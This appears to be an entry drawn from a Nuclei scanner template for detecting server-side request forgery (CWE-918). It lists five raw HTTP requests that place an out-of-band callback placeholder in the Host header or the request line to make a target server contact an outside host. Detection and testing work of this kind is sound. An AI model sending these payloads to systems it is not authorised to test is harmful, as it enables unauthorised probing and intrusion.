# Vulnerability: OOB Request Based Interaction
**Classification:** CWE-918
**Source:** Nuclei Template (`request-based-interaction.yaml`)

## Description
The remote server fetched a spoofed DNS Name from the request.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{interactsh-url}}
Cache-Control: no-transform
Accept: */*

GET / HTTP/1.1
Host: @{{interactsh-url}}
Cache-Control: no-transform
Accept: */*

GET http://{{interactsh-url}}/ HTTP/1.1
Host: {{Hostname}}
Cache-Control: no-transform
Accept: */*

GET @{{interactsh-url}}/ HTTP/1.1
Host: {{Hostname}}
Cache-Control: no-transform
Accept: */*

GET {{interactsh-url}}:80/ HTTP/1.1
Host: {{Hostname}}
Cache-Control: no-transform
Accept: */*
```

